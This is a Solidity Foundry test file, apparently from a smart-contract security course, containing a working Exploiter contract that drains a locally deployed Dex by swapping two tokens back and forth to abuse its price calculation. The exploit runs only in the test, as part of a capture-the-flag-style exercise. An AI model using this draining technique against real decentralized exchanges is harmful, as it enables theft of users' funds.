// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "week6-7-static-analysis/echidna/dex1/dex1.sol";

contract DexTest is Test {
    Dex dex;
    Exploiter exploiter;
    SwappableToken token1;
    SwappableToken token2;

    function setUp() public {
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "token1", "T1", 110);
        token2 = new SwappableToken(address(dex), "token2", "T2", 110);
        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        exploiter = new Exploiter(dex, address(token1), address(token2));
        token1.transfer(address(exploiter), 10);
        token2.transfer(address(exploiter), 10);
    }

    function test_setUp() public {
        assertEq(token1.balanceOf(address(dex)), 100);
        assertEq(token2.balanceOf(address(dex)), 100);
        assertEq(token1.balanceOf(address(exploiter)), 10);
        assertEq(token2.balanceOf(address(exploiter)), 10);
    }

    function test_attack() public {
        exploiter.attack();
        assert(_isComplete());
    }

    function _isComplete() internal view returns (bool) {
        uint256 balance1 = ERC20(token1).balanceOf(address(dex));
        uint256 balance2 = ERC20(token2).balanceOf(address(dex));
        return balance1 == 0 || balance2 == 0;
    }
}

contract Exploiter {
    Dex dex;
    address token1;
    address token2;

    constructor(Dex dex_, address token1_, address token2_) {
        dex = dex_;
        token1 = token1_;
        token2 = token2_;
    }

    function attack() external {
        uint256 fromAmount;
        uint256 toAmount;
        uint256 dexBalance;
        uint256 i = 0;
        address from;
        address to;
        while (!isComplete()) {
            // Swap from and to with each cycle
            if (i % 2 == 0) {
                from = token1;
                to = token2;
            } else {
                from = token2;
                to = token1;
            }

            fromAmount = ERC20(from).balanceOf(address(this));

            // Determine the amount of tokens that will be recieved (toAmount)
            dexBalance = ERC20(to).balanceOf(address(dex));
            toAmount = dex.getSwapfromAmount(from, to, fromAmount);

            // If the toAmount is greater than what the dex has left, then
            // calculate the exact fromAmount to empty out the dex's remaining.
            if (toAmount > dexBalance) {
                // This formula is the inverse of the dex's price function.
                fromAmount =
                    (dexBalance * IERC20(from).balanceOf(address(dex))) /
                    IERC20(to).balanceOf(address(dex));
            }

            // Make the swap
            dex.approve(address(dex), fromAmount);
            dex.swap(from, to, fromAmount);

            i++;
        }

        console.log("rounds", i);
        console.log("dex.token1", ERC20(token1).balanceOf(address(dex)));
        console.log("dex.token2", ERC20(token2).balanceOf(address(dex)));
        console.log("this.token1", ERC20(token1).balanceOf(address(this)));
        console.log("this.token2", ERC20(token2).balanceOf(address(this)));
    }

    function isComplete() internal view returns (bool) {
        uint256 balance1 = ERC20(token1).balanceOf(address(dex));
        uint256 balance2 = ERC20(token2).balanceOf(address(dex));
        return balance1 == 0 || balance2 == 0;
    }
}
